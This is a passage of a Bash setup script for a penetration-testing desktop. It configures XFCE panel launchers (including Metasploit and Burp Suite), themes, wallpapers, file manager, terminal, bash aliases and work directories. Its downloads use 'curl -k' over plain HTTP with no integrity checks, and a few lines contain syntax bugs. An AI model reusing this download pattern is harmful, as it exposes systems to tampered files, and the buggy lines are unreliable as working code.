  -t int -s 10  -t int -s 11  -t int -s 13  -t int -s 15  -t int -s 16  -t int -s 17  -t int -s 19  -t int -s 20
xfconf-query -n -c xfce4-panel -p /panels/panel-0/length -t int -s 100
xfconf-query -n -c xfce4-panel -p /panels/panel-0/size -t int -s 30
xfconf-query -n -c xfce4-panel -p /panels/panel-0/position -t string -s "p=6;x=0;y=0"
xfconf-query -n -c xfce4-panel -p /panels/panel-0/position-locked -t bool -s true
xfconf-query -n -c xfce4-panel -p /plugins/plugin-1 -t string -s applicationsmenu     # application menu
xfconf-query -n -c xfce4-panel -p /plugins/plugin-2 -t string -s launcher             # terminal   ID: exo-terminal-emulator
xfconf-query -n -c xfce4-panel -p /plugins/plugin-3 -t string -s places               # places
xfconf-query -n -c xfce4-panel -p /plugins/plugin-4 -t string -s launcher             # wireshark  ID: wireshark
xfconf-query -n -c xfce4-panel -p /plugins/plugin-5 -t string -s launcher             # firefox    ID: firefox
[ "${burpFree}" != "false" ] \
  && xfconf-query -n -c xfce4-panel -p /plugins/plugin-6 -t string -s launcher        # burpsuite  ID: burpsuite
xfconf-query -n -c xfce4-panel -p /plugins/plugin-7 -t string -s launcher             # msf        ID: msfconsole
xfconf-query -n -c xfce4-panel -p /plugins/plugin-8 -t string -s launcher             # gedit      ID: org.gnome.gedit.desktop
xfconf-query -n -c xfce4-panel -p /plugins/plugin-9 -t string -s launcher             # search     ID: xfce4-appfinder
xfconf-query -n -c xfce4-panel -p /plugins/plugin-10 -t string -s tasklist
xfconf-query -n -c xfce4-panel -p /plugins/plugin-11 -t string -s separator
xfconf-query -n -c xfce4-panel -p /plugins/plugin-13 -t string -s mixer   # audio
xfconf-query -n -c xfce4-panel -p /plugins/plugin-15 -t string -s systray
xfconf-query -n -c xfce4-panel -p /plugins/plugin-16 -t string -s actions
xfconf-query -n -c xfce4-panel -p /plugins/plugin-17 -t string -s clock
xfconf-query -n -c xfce4-panel -p /plugins/plugin-19 -t string -s pager
xfconf-query -n -c xfce4-panel -p /plugins/plugin-20 -t string -s showdesktop
#--- application menu
xfconf-query -n -c xfce4-panel -p /plugins/plugin-1/show-tooltips -t bool -s true
xfconf-query -n -c xfce4-panel -p /plugins/plugin-1/show-button-title -t bool -s false
#--- terminal
xfconf-query -n -c xfce4-panel -p /plugins/plugin-2/items -t string -s "exo-terminal-emulator.desktop" -a
#--- places
xfconf-query -n -c xfce4-panel -p /plugins/plugin-3/mount-open-volumes -t bool -s true
#--- wireshark
xfconf-query -n -c xfce4-panel -p /plugins/plugin-4/items -t string -s "wireshark.desktop" -a
#--- firefox
xfconf-query -n -c xfce4-panel -p /plugins/plugin-5/items -t string -s "firefox.desktop" -a
#--- burp
[ "${burpFree}" != "false" ] \
  && xfconf-query -n -c xfce4-panel -p /plugins/plugin-6/items -t string -s "burpsuite.desktop" -a
#--- metasploit
xfconf-query -n -c xfce4-panel -p /plugins/plugin-7/items -t string -s "msfconsole.desktop" -a
#--- gedit/atom
xfconf-query -n -c xfce4-panel -p /plugins/plugin-8/items -t string -s "textedit.desktop" -a
#--- search
xfconf-query -n -c xfce4-panel -p /plugins/plugin-9/items -t string -s "xfce4-appfinder.desktop" -a
#--- tasklist (& separator - required for padding)
xfconf-query -n -c xfce4-panel -p /plugins/plugin-10/show-labels -t bool -s true
xfconf-query -n -c xfce4-panel -p /plugins/plugin-10/show-handle -t bool -s false
xfconf-query -n -c xfce4-panel -p /plugins/plugin-11/style -t int -s 0
xfconf-query -n -c xfce4-panel -p /plugins/plugin-11/expand -t bool -s true
#--- systray
xfconf-query -n -c xfce4-panel -p /plugins/plugin-15/show-frame -t bool -s false
#--- actions
xfconf-query -n -c xfce4-panel -p /plugins/plugin-16/appearance -t int -s 1
xfconf-query -n -c xfce4-panel -p /plugins/plugin-16/items \
  -t string -s "+logout-dialog"  -t string -s "-switch-user"  -t string -s "-separator" \
  -t string -s "-logout"  -t string -s "+lock-screen"  -t string -s "+hibernate"  -t string -s "+suspend"  -t string -s "+restart"  -t string -s "+shutdown"  -a
#--- clock
xfconf-query -n -c xfce4-panel -p /plugins/plugin-17/show-frame -t bool -s false
xfconf-query -n -c xfce4-panel -p /plugins/plugin-17/mode -t int -s 2
xfconf-query -n -c xfce4-panel -p /plugins/plugin-17/digital-format -t string -s "%R, %Y-%m-%d"
#--- pager / workspace
xfconf-query -n -c xfce4-panel -p /plugins/plugin-19/miniature-view -t bool -s true
xfconf-query -n -c xfce4-panel -p /plugins/plugin-19/rows -t int -s 1
xfconf-query -n -c xfwm4 -p /general/workspace_count -t int -s 5
#--- Theme options
xfconf-query -n -c xsettings -p /Net/ThemeName -s "air"
xfconf-query -n -c xsettings -p /Net/IconThemeName -s "Vibrancy-Kali"
xfconf-query -n -c xsettings -p /Gtk/MenuImages -t bool -s true
xfconf-query -n -c xfce4-panel -p /plugins/plugin-1/button-icon -t string -s "parrot-menu"
#--- Window management
xfconf-query -n -c xfwm4 -p /general/snap_to_border -t bool -s true
xfconf-query -n -c xfwm4 -p /general/snap_to_windows -t bool -s true
xfconf-query -n -c xfwm4 -p /general/wrap_windows -t bool -s false
xfconf-query -n -c xfwm4 -p /general/wrap_workspaces -t bool -s false
xfconf-query -n -c xfwm4 -p /general/click_to_focus -t bool -s false
xfconf-query -n -c xfwm4 -p /general/click_to_focus -t bool -s true
#--- Hide icons
xfconf-query -n -c xfce4-desktop -p /desktop-icons/file-icons/show-filesystem -t bool -s false
xfconf-query -n -c xfce4-desktop -p /desktop-icons/file-icons/show-home -t bool -s false
xfconf-query -n -c xfce4-desktop -p /desktop-icons/file-icons/show-trash -t bool -s false
xfconf-query -n -c xfce4-desktop -p /desktop-icons/file-icons/show-removable -t bool -s false
#--- Start and exit values
xfconf-query -n -c xfce4-session -p /splash/Engine -t string -s ""
xfconf-query -n -c xfce4-session -p /shutdown/LockScreen -t bool -s true
xfconf-query -n -c xfce4-session -p /general/SaveOnExit -t bool -s false
#--- App Finder
xfconf-query -n -c xfce4-appfinder -p /last/pane-position -t int -s 248
xfconf-query -n -c xfce4-appfinder -p /last/window-height -t int -s 742
xfconf-query -n -c xfce4-appfinder -p /last/window-width -t int -s 648
#--- Enable compositing
xfconf-query -n -c xfwm4 -p /general/use_compositing -t bool -s true
xfconf-query -n -c xfwm4 -p /general/frame_opacity -t int -s 85
#--- Remove "Mail Reader" from menu
file=/usr/share/applications/exo-mail-reader.desktop   #; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^NotShowIn=*/NotShowIn=XFCE;/; s/^OnlyShowIn=XFCE;/OnlyShowIn=/' "${file}"
grep -q "NotShowIn=XFCE" "${file}" \
  || echo "NotShowIn=XFCE;" >> "${file}"
#--- XFCE for default applications
mkdir -p ~/.local/share/applications/
file=~/.local/share/applications/mimeapps.list; [ -e "${file}" ] && cp -n $file{,.bkup}
[ ! -e "${file}" ] \
  && echo '[Added Associations]' > "${file}"
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
#--- Firefox
for VALUE in http https; do
  sed -i 's#^x-scheme-handler/'${VALUE}'=.*#x-scheme-handler/'${VALUE}'=exo-web-browser.desktop#' "${file}"
  grep -q '^x-scheme-handler/'${VALUE}'=' "${file}" 2>/dev/null \
    || echo 'x-scheme-handler/'${VALUE}'=exo-web-browser.desktop' >> "${file}"
done
#--- Thunar
for VALUE in file trash; do
  sed -i 's#x-scheme-handler/'${VALUE}'=.*#x-scheme-handler/'${VALUE}'=exo-file-manager.desktop#' "${file}"
  grep -q '^x-scheme-handler/'${VALUE}'=' "${file}" 2>/dev/null \
    || echo 'x-scheme-handler/'${VALUE}'=exo-file-manager.desktop' >> "${file}"
done
file=~/.config/xfce4/helpers.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's#^FileManager=.*#FileManager=Thunar#' "${file}" 2>/dev/null
grep -q '^FileManager=Thunar' "${file}" 2>/dev/null \
  || echo 'FileManager=Thunar' >> "${file}"
#--- Disable user folders in home folder
file=/etc/xdg/user-dirs.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^XDG_/#XDG_/g; s/^#XDG_DESKTOP/XDG_DESKTOP/g;' "${file}"
sed -i 's/^enable=.*/enable=False/' "${file}"
find ~/ -maxdepth 1 -mindepth 1 -type d \
  \( -name 'Documents' -o -name 'Music' -o -name 'Pictures' -o -name 'Public' -o -name 'Templates' -o -name 'Videos' \) -empty -delete
apt -y -qq install xdg-user-dirs \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
xdg-user-dirs-update
#--- Remove any old sessions
rm -f ~/.cache/sessions/*
#--- Set XFCE as default desktop manager
update-alternatives --set x-session-manager /usr/bin/xfce4-session   #update-alternatives --config x-window-manager   #echo "xfce4-session" > ~/.xsession


##### Configure XFCE4
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring ${GREEN}XFCE4${RESET}${RESET} ~ desktop environment"
#--- Disable user folders
apt -y -qq install xdg-user-dirs || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
xdg-user-dirs-update
file=/etc/xdg/user-dirs.conf; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/^enable=.*/enable=False/' "${file}"   #sed -i 's/^XDG_/#XDG_/; s/^#XDG_DESKTOP/XDG_DESKTOP/;' ~/.config/user-dirs.dirs
find ~/ -maxdepth 1 -mindepth 1 \( -name 'Documents' -o -name 'Music' -o -name 'Pictures' -o -name 'Public' -o -name 'Templates' -o -name 'Videos' \) -type d -empty -delete
xdg-user-dirs-update
#--- XFCE fixes for default applications
mkdir -p ~/.local/share/applications/
file=~/.local/share/applications/mimeapps.list; [ -e "${file}" ] && cp -n $file{,.bkup}
[ ! -e "${file}" ] && echo '[Added Associations]' > "${file}"
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
for VALUE in file trash; do
  sed -i 's#x-scheme-handler/'${VALUE}'=.*#x-scheme-handler/'${VALUE}'=exo-file-manager.desktop#' "${file}"
  grep -q '^x-scheme-handler/'${VALUE}'=' "${file}" 2>/dev/null || echo 'x-scheme-handler/'${VALUE}'=exo-file-manager.desktop' >> "${file}"
done
for VALUE in http https; do
  sed -i 's#^x-scheme-handler/'${VALUE}'=.*#x-scheme-handler/'${VALUE}'=exo-web-browser.desktop#' "${file}"
  grep -q '^x-scheme-handler/'${VALUE}'=' "${file}" 2>/dev/null || echo 'x-scheme-handler/'${VALUE}'=exo-web-browser.desktop' >> "${file}"
done
[[ $(tail -n 1 "${file}") != "" ]] && echo >> "${file}"
file=~/.config/xfce4/helpers.rc; [ -e "${file}" ] && cp -n $file{,.bkup}    #exo-preferred-applications   #xdg-mime default
sed -i 's#^FileManager=.*#FileManager=Thunar#' "${file}" 2>/dev/null
grep -q '^FileManager=Thunar' "${file}" 2>/dev/null || echo 'FileManager=Thunar' >> "${file}"
#--- Configure file browser - Thunar (need to re-login for effect)
mkdir -p ~/.config/Thunar/
file=~/.config/Thunar/thunarrc; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's/LastShowHidden=.*/LastShowHidden=TRUE/' "${file}" 2>/dev/null || echo -e "[Configuration]\nLastShowHidden=TRUE" > ~/.config/Thunar/thunarrc;
#--- Fix GNOME keyring issue
file=/etc/xdg/autostart/gnome-keyring-pkcs11.desktop;   #[ -e "${file}" ] && cp -n $file{,.bkup}
grep -q "XFCE" "${file}" || sed -i 's/^OnlyShowIn=*/OnlyShowIn=XFCE;/' "${file}"
#--- Set XFCE as default desktop manager
file=~/.xsession; [ -e "${file}" ] && cp -n $file{,.bkup}       #~/.xsession
echo xfce4-session > "${file}"
#--- Enable num lock at start up (might not be smart if you're using a smaller keyboard (laptop?)) ~ https://wiki.xfce.org/faq
#xfconf-query -n -c keyboards -p /Default/Numlock -t bool -s true
apt -y -qq install numlockx || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
file=/etc/xdg/xfce4/xinitrc; [ -e "${file}" ] && cp -n $file{,.bkup}     #/etc/rc.local
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^/usr/bin/numlockx' "${file}" 2>/dev/null || echo "/usr/bin/numlockx on" >> "${file}"
#--- Add keyboard shortcut (CTRL+SPACE) to open Application Finder
file=~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml   #; [ -e "${file}" ] && cp -n $file{,.bkup}
grep -q '<property name="&lt;Primary&gt;space" type="string" value="xfce4-appfinder"/>' "${file}" || sed -i 's#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>\n      <property name="\&lt;Primary\&gt;space" type="string" value="xfce4-appfinder"/>#' "${file}"
#--- Add keyboard shortcut (CTRL+ALT+t) to start a terminal window
file=~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml   #; [ -e "${file}" ] && cp -n $file{,.bkup}
grep -q '<property name="&lt;Primary&gt;&lt;Alt&gt;t" type="string" value="/usr/bin/exo-open --launch TerminalEmulator"/>' "${file}" || sed -i 's#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>\n      <property name="\&lt;Primary\&gt;\&lt;Alt\&gt;t" type="string" value="/usr/bin/exo-open --launch TerminalEmulator"/>#' "${file}"
#--- Create Conky refresh script (conky gets installed later)
file=/usr/local/bin/conky-refresh; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
/usr/bin/timeout 5 /usr/bin/killall -9 -q -w conky
/usr/bin/conky &
EOF
chmod -f 0500 "${file}"
#--- Add keyboard shortcut (CTRL+r) to run the conky refresh script
file=~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml   #; [ -e "${file}" ] && cp -n $file{,.bkup}
grep -q '<property name="&lt;Primary&gt;r" type="string" value="/usr/local/bin/conky-refresh"/>' "${file}" || sed -i 's#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>\n      <property name="\&lt;Primary\&gt;r" type="string" value="/usr/local/bin/conky-refresh"/>#' "${file}"
#--- Remove any old sessions
rm -f ~/.cache/sessions/*
#--- Reload XFCE
#/usr/bin/xfdesktop --reload


##### Cosmetics (themes & wallpapers)
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}Cosmetics${RESET}${RESET} ~ Making it different each startup"
mkdir -p ~/.themes/
export DISPLAY=:0.0   #[[ -z $SSH_CONNECTION ]] || export DISPLAY=:0.0
#--- shiki-colors-light v1.3 XFCE4 theme
timeout 300 curl  -k -L -f "http://xfce-look.org/CONTENT/content-files/142110-Shiki-Colors-Light-Menus.tar.gz" > /tmp/Shiki-Colors-Light-Menus.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Shiki-Colors-Light-Menus.tar.gz" 1>&2    #***!!! hardcoded path!
tar -zxf /tmp/Shiki-Colors-Light-Menus.tar.gz -C ~/.themes/
#xfconf-query -n -c xsettings -p /Net/ThemeName -s "Shiki-Colors-Light-Menus"
#xfconf-query -n -c xsettings -p /Net/IconThemeName -s "Vibrancy-Kali-Dark"

#--- axiom / axiomd (May 18 2010) XFCE4 theme
timeout 300 curl  -k -L -f "http://xfce-look.org/CONTENT/content-files/90145-axiom.tar.gz" > /tmp/axiom.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading axiom.tar.gz" 1>&2    #***!!! hardcoded path!
tar -zxf /tmp/axiom.tar.gz -C ~/.themes/
xfconf-query -n -c xsettings -p /Net/ThemeName -s "axiomd"
xfconf-query -n -c xsettings -p /Net/IconThemeName -s "Vibrancy-Kali-Dark"

#--- Get new desktop wallpaper
##--Temp for wallpapers
# timeout 300 curl  -k -L -f "" > /usr/share/wallpapers/*name.jpg || echo -e ' '${RED}'[!]'${RESET}" Issue downloading *name.jpg" 1>&2
mkdir -p /usr/share/wallpapers/
timeout 300 curl  -k -L -f "http://orig11.deviantart.net/4b8b/f/2011/137/a/1/noob_saibot_wallpaper_2_hd_by_gurt1337-d3gl9nv.jpg" > /usr/share/wallpapers/noob_saibot2.jpg || echo -e ' '${RED}'[!]'${RESET}" Issue downloading noob_saibot_wallpaper_2_hd_by_gurt1337-d3gl9nv.jpg" 1>&2
timeout 300 curl  -k -L -f "http://orig04.deviantart.net/e24e/f/2011/274/6/2/mortal_kombat___noob_saibot_by_xenon90-d4bib6a.jpg" > /usr/share/wallpapers/noob_saibot_by_xenon90-d4bib6a.jpg || echo -e ' '${RED}'[!]'${RESET}" Issue downloading mortal_kombat___noob_saibot_by_xenon90-d4bib6a.jpg" 1>&2
timeout 300 curl  -k -L -f "http://www.goodwp.com/pic/201402/1920x1200/goodwp.com-30740.jpg" > /usr/share/wallpapers/noob_smoke.jpg || echo -e ' '${RED}'[!]'${RESET}" Issue downloading noob_smoke.jpg" 1>&2
timeout 300 curl  -k -L -f "http://wallpapercraze.com/images/wallpapers/noobsaibot-493654.jpeg" > /usr/share/wallpapers/noob_saibot_493654.jpeg || echo -e ' '${RED}'[!]'${RESET}" noob_saibot_493654.jpeg" 1>&2
timeout 300 curl  -k -L -f "http://i.imgur.com/CTWxDQh.jpg" > /usr/share/wallpapers/noob_CTWxDQh.jpg || echo -e ' '${RED}'[!]'${RESET}" Issue downloading noob_CTWxDQh.jpg" 1>&2
_TMP="$(find /usr/share/wallpapers/ -maxdepth 1 -type f \( -name 'noob_*' -o -empty \) | xargs -n1 file | grep -i 'HTML\|empty' | cut -d ':' -f1)"
for FILE in $(echo ${_TMP}); do rm -f "${FILE}"; done
[[ -e "/usr/share/wallpapers/kali_default-1440x900.jpg" ]] && ln -sf /usr/share/wallpapers/kali/contents/images/1440x900.png /usr/share/wallpapers/kali_default-1440x900.jpg                       # Kali1
[[ -e "/usr/share/images/desktop-base/kali-wallpaper_1920x1080.png" ]] && ln -sf /usr/share/images/desktop-base/kali-wallpaper_1920x1080.png /usr/share/wallpapers/kali_default2.0-1920x1080.jpg   # Kali2
[[ -e "/usr/share/gnome-shell/theme/KaliLogin.png" ]] && cp -f /usr/share/gnome-shell/theme/KaliLogin.png /usr/share/wallpapers/KaliLogin2.0-login.jpg                                             # Kali2
#--- Change desktop wallpaper (single random pick - on each install).   Note: For now...
wallpaper=$(shuf -n1 -e /usr/share/wallpapers/noob_*)   #wallpaper=/usr/share/wallpapers/kali_blue_splat.png
xfconf-query -n -c xfce4-desktop -p /backdrop/screen0/monitor0/image-show -t bool -s true
xfconf-query -n -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path - string -s "${wallpaper}"   # XFCE
dconf write /org/gnome/desktop/background/picture-uri "'file://${wallpaper}'"                          # GNOME
#--- Change login wallpaper
dconf write /org/gnome/desktop/screensaver/picture-uri "'file://${wallpaper}'"   # Change lock wallpaper (before swipe)
cp -f "${wallpaper}" /usr/share/gnome-shell/theme/KaliLogin.png                  # Change login wallpaper (after swipe)
#--- New wallpaper - add to startup (random each login)
file=/usr/local/bin/rand-wallpaper; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
wallpaper="\$(shuf -n1 -e \$(find /usr/share/wallpapers/ -maxdepth 1 -type f -name 'noob_*'))"
/usr/bin/xfconf-query -n -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -t string -s \${wallpaper}
/usr/bin/dconf write /org/gnome/desktop/screensaver/picture-uri "'file://\${wallpaper}'"    # Change lock wallpaper (before swipe)
cp -f "\${wallpaper}" /usr/share/gnome-shell/theme/KaliLogin.png                            # Change login wallpaper (after swipe)
/usr/bin/xfdesktop --reload 2>/dev/null
EOF
chmod -f 0500 "${file}"
mkdir -p ~/.config/autostart/
file=~/.config/autostart/wallpaper.desktop; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
[Desktop Entry]
Type=Application
Exec=/usr/local/bin/rand-wallpaper
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=wallpaper
EOF
#--- Remove old temp files
rm -f /tmp/Shiki-Colors-Light-Menus.tar* /tmp/axiom.tar*


##### Configure file   Note: need to restart xserver for effect
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring ${GREEN}file${RESET} (Nautilus/Thunar) ~ GUI file system navigation"
mkdir -p ~/.config/gtk-2.0/
file=~/.config/gtk-2.0/gtkfilechooser.ini; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's/^.*ShowHidden.*/ShowHidden=true/' "${file}" 2>/dev/null || cat <<EOF > "${file}"
[Filechooser Settings]
LocationMode=path-bar
ShowHidden=true
ExpandFolders=false
ShowSizeColumn=true
GeometryX=66
GeometryY=39
GeometryWidth=780
GeometryHeight=618
SortColumn=name
SortOrder=ascending
EOF
dconf write /org/gnome/nautilus/preferences/show-hidden-files true
file=/root/.gtk-bookmarks; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^file:///root/Downloads ' "${file}" 2>/dev/null || echo 'file:///root/Downloads Downloads' >> "${file}"
(dmidecode | grep -iq vmware) && (mkdir -p /mnt/hgfs/ 2>/dev/null; grep -q '^file:///mnt/hgfs ' "${file}" 2>/dev/null || echo 'file:///mnt/hgfs VMShare' >> "${file}")
grep -q '^file:///tmp ' "${file}" 2>/dev/null || echo 'file:///tmp TMP' >> "${file}"
grep -q '^file:///usr/share ' "${file}" 2>/dev/null || echo 'file:///usr/share Parrot Tools' >> "${file}"
grep -q '^file:///opt ' "${file}" 2>/dev/null || echo 'file:///opt Tools' >> "${file}"
grep -q '^file:///usr/local/src ' "${file}" 2>/dev/null || echo 'file:///usr/local/src SRC' >> "${file}"
grep -q '^file:///var/ftp ' "${file}" 2>/dev/null || echo 'file:///var/ftp FTP' >> "${file}"
grep -q '^file:///var/samba ' "${file}" 2>/dev/null || echo 'file:///var/samba Samba' >> "${file}"
grep -q '^file:///var/tftp ' "${file}" 2>/dev/null || echo 'file:///var/tftp TFTP' >> "${file}"
grep -q '^file:///var/www/html ' "${file}" 2>/dev/null || echo 'file:///var/www/html WWW' >> "${file}"


##### Configure GNOME terminal   Note: need to restart xserver for effect
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring GNOME ${GREEN}terminal${RESET} ~ CLI interface"
gconftool-2 -t bool -s /apps/gnome-terminal/profiles/Default/scrollback_unlimited true                   # Terminal -> Edit -> Profile Preferences -> Scrolling -> Scrollback: Unlimited -> Close
gconftool-2 -t string -s /apps/gnome-terminal/profiles/Default/background_darkness 0.85611499999999996   # Not working 100%!
gconftool-2 -t string -s /apps/gnome-terminal/profiles/Default/background_type transparent


##### Configure bash - all users
echo -e "\n  Configuring ${GREEN}bash ~ CLI shell"
file=/etc/bash.bashrc; [ -e "${file}" ] && cp -n $file{,.bkup}   #~/.bashrc
grep -q "cdspell" "${file}" || echo "shopt -sq cdspell" >> "${file}"             # Spell check 'cd' commands
grep -q "checkwinsize" "${file}" || echo "shopt -sq checkwinsize" >> "${file}"   # Wrap lines correctly after resizing
grep -q "nocaseglob" "${file}" || echo "shopt -sq nocaseglob" >> "${file}"       # Case insensitive pathname expansion
grep -q "HISTSIZE" "${file}" || echo "HISTSIZE=10000" >> "${file}"               # Bash history (memory scroll back)
grep -q "HISTFILESIZE" "${file}" || echo "HISTFILESIZE=10000" >> "${file}"       # Bash history (file .bash_history)
#--- Apply new configs
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi

##### Install bash colour - all users
echo -e "\n Installing bash colour ~ colours shell output"
file=/etc/bash.bashrc; [ -e "${file}" ] && cp -n $file{,.bkup}   #~/.bashrc
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's/.*force_color_prompt=.*/force_color_prompt=yes/' "${file}"
grep -q '^force_color_prompt' "${file}" 2>/dev/null || echo 'force_color_prompt=yes' >> "${file}"
sed -i 's#PS1='"'"'.*'"'"'#PS1='"'"'${debian_chroot:+($debian_chroot)}\\[\\033\[01;31m\\]\\u@\\h\\\[\\033\[00m\\]:\\[\\033\[01;34m\\]\\w\\[\\033\[00m\\]\\$ '"'"'#' "${file}"
grep -q "^export LS_OPTIONS='--color=auto'" "${file}" 2>/dev/null || echo "export LS_OPTIONS='--color=auto'" >> "${file}"
grep -q '^eval "$(dircolors)"' "${file}" 2>/dev/null || echo 'eval "$(dircolors)"' >> "${file}"
grep -q "^ls='ls $LS_OPTIONS'" "${file}" 2>/dev/null || echo "alias ls='ls $LS_OPTIONS'" >> "${file}"
grep -q "^alias ll='ls $LS_OPTIONS -l'" "${file}" 2>/dev/null || echo "alias ll='ls $LS_OPTIONS -l'" >> "${file}"
grep -q "^alias l='ls $LS_OPTIONS -lA'" "${file}" 2>/dev/null || echo "alias l='ls $LS_OPTIONS -lA'" >> "${file}"
#--- All other users that are made afterwards
file=/etc/skel/.bashrc   #; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/.*force_color_prompt=.*/force_color_prompt=yes/' "${file}"
#--- Apply new configs
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi


##### Install grc
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}grc${RESET} ~ colours shell output"
apt -y -qq install grc || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- General system ones
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^## grep aliases' "${file}" 2>/dev/null || echo -e '## grep aliases\nalias grep="grep --color=always"\nalias ngrep="grep -n"\n' >> "${file}"
grep -q '^alias egrep=' "${file}" 2>/dev/null || echo -e 'alias egrep="egrep --color=auto"\n' >> "${file}"
grep -q '^alias fgrep=' "${file}" 2>/dev/null || echo -e 'alias fgrep="fgrep --color=auto"\n' >> "${file}"
#--- Add in ours (OS programs)
grep -q '^alias tmux' "${file}" 2>/dev/null || echo -e '## tmux\nalias tmux="tmux attach || tmux new"\n' >> "${file}"    #alias tmux="tmux attach -t $HOST || tmux new -s $HOST"
grep -q '^alias axel' "${file}" 2>/dev/null || echo -e '## axel\nalias axel="axel -a"\n' >> "${file}"
grep -q '^alias screen' "${file}" 2>/dev/null || echo -e '## screen\nalias screen="screen -xRR"\n' >> "${file}"
#--- Add in ours (shortcuts)
grep -q '^## nmap scripts' "${file}" 2>/dev/null || echo -e '## nmap scripts\nalias nse="ls /usr/share/nmap/scripts | grep"\n' >> "${file}"
grep -q '^## Checksums' "${file}" 2>/dev/null || echo -e '## Checksums\nalias sha1="openssl sha1"\nalias md5="openssl md5"\n' >> "${file}"
grep -q '^## python web server' "${file}" 2>/dev/null || echo -e '## python web server\nalias pyweb="python -m SimpleHTTPServer 8000"\n' >> "${file}"
grep -q '^## ping count 5' "${file}" 2>/dev/null || echo -e '## ping count 5\nalias check="ping -c 5"\n' >> "${file}"
echo "making Lab directory"
mkdir -pv ~/lab
grep -q '^## cd lab' "${file}" 2>/dev/null || echo -e '## cd lab\nalias lab="cd ~/lab" \n' >> "${file}"
echo "making Bug Bounty directory"
mkdir -pv ~/BB-Tools
grep -q '^## cd BB-Tools' "${file}" 2>/dev/null || echo -e '## cd lab\nalias BB-Tools="cd ~/BB-Tools" \n' >> "${file}"
grep -q '^## list file pref' "${file}" 2>/dev/null || echo -e '## list file pref\nalias lh="ls -lisAd .[^.]*" \n' >> "${file}"
grep -q '^## List open ports' "${file}" 2>/dev/null || echo -e '## List open ports\nalias ports="netstat -tulanp"\n' >> "${file}"
grep -q '^## Get header' "${file}" 2>/dev/null || echo -e '## Get header\nalias header="curl -I"\n' >> "${file}"
grep -q '^## Get external IP address' "${file}" 2>/dev/null || echo -e '## Get external IP address\nalias ipx="curl -s http://ipinfo.io/ip"\n' >> "${file}"
grep -q '^## DNS - External IP #1' "${file}" 2>/dev/null || echo -e '## DNS - External IP #1\nalias dns1="dig +short @resolver1.opendns.com myip.opendns.com"\n' >> "${file}"
grep -q '^## DNS - External IP #2' "${file}" 2>/dev/null || echo -e '## DNS - External IP #2\nalias dns2="dig +short @208.67.222.222 myip.opendns.com"\n' >> "${file}"
grep -q '^## DNS - Check' "${file}" 2>/dev/null || echo -e '### DNS - Check ("#.abc" is Okay)\nalias dns3="dig +short @208.67.220.220 which.opendns.com txt"\n' >> "${file}"
grep -q '^## Directory navigation aliases' "${file}" 2>/dev/null || echo -e '## Directory navigation aliases\nalias ..="cd .."\nalias ...="cd ../.."\nalias ....="cd ../../.."\nalias .....="cd ../../../.."\n' >> "${file}"
